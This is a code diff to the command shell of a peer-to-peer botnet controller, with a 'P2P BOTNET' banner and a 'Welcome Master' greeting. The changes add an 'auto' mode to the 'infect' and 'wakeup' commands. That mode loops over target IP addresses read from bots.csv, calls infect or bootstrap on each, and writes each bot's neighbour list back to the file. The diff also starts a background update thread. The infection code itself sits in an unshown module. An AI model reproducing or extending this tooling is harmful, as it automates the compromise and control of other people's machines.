@@ -1,7 +1,9 @@
 from master import Master
 from subprocess import call, Popen, PIPE, STDOUT
 from cmd import Cmd
-
+import pandas as pd
+import threading
+import time
 
 master = Master()
 
@@ -36,11 +38,26 @@ class MyPrompt(Cmd):
     def do_infect(self, ip_addr):
         global master
         print("infecting ", ip_addr)
-        master.infect(ip_addr)
+        if ip_addr == 'auto':
+            dataframe = pd.read_csv("./bots.csv")
+            for ip in dataframe.ip_addr:
+                master.infect(ip)
+        else:
+            master.infect(ip_addr)
 
     def do_wakeup(self, ip_addr):
         global master
-        master.bootstrap(ip_addr)
+        if ip_addr == 'auto':
+            dataframe = pd.read_csv("./bots.csv")
+            for ip in dataframe.ip_addr:
+                master.bootstrap(ip)
+            time.sleep(1)
+            for ip in dataframe.ip_addr:
+                neighbors = str(master.show_neighbors(ip))
+                dataframe.loc[dataframe['ip_addr']==ip, ['neighbors']] = neighbors
+                dataframe.to_csv("./bots.csv", index=False)
+        else:
+            master.bootstrap(ip_addr)
 
     def do_sleep(self, ip_addr):
         global master
@@ -70,12 +87,15 @@ class MyPrompt(Cmd):
 
 
 def main():
-
+    global master
     call(["toilet", "P2P BOTNET"])
     welcome = "toilet -f future 'Welcome Master' | boxes -d cat -a hc -p h1 | lolcat"
     cat_ps = Popen(welcome,shell=True,stdout=PIPE,stderr=STDOUT)
     output = cat_ps.communicate()[0]
     print (output)
+   # _thread.start_new_thread(master.update_background())
+    update_thread = threading.Thread(target=master.update_background)
+    update_thread.start()
     shell = MyPrompt()
     shell.cmdloop()
 
